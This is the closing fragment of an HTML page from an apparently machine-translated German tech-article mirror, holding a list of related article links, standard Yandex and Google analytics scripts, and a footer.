<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><img src="https://habrastorage.org/webt/iq/fi/b4/iqfib45pgphfrxv--zfemt0qnmw.jpeg"></a></div>
      
    </div>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../de493692/index.html">Theoretische Datenstrukturen und ihre Anwendung in JavaScript. P1. Paare</a></li>
<li><a href="../de493696/index.html">Beschleunigung des Qemu KVM-Festplattensubsystems unter Linux</a></li>
<li><a href="../de493700/index.html">Verwenden von Malware in Azure, um Zugriff auf Microsoft 365-Mandanten zu erhalten</a></li>
<li><a href="../de493702/index.html">Massiver Übergang zur Fernarbeit: technische Probleme und Sicherheitsbedrohungen</a></li>
<li><a href="../de493704/index.html">Verwenden von TypeScript in JavaScript ohne Schreiben von TypeScript</a></li>
<li><a href="../de493708/index.html">Anatomie meines Heimat-Kubernetes-Clusters</a></li>
<li><a href="../de493712/index.html">Neue TypeScript-Funktionen für verbesserte Benutzerfreundlichkeit</a></li>
<li><a href="../de493714/index.html">Sicherheits-Spickzettel: Nodejs</a></li>
<li><a href="../de493716/index.html">Typinferenz mit TypeScript unter Verwendung des Konstrukts as const und des Schlüsselworts infer</a></li>
<li><a href="../de493718/index.html">Diskussion: Standard-UNIX-Dienstprogramme, die nur wenige verwendet haben und derzeit verwenden</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter63335242 = new Ya.Metrika({
                  id:63335242,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/63335242" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-13', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Geek Week | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2020</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=i62cJ2037o_BACd40gCrIso3niu0Sjx2sDFYJkeYdRk&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>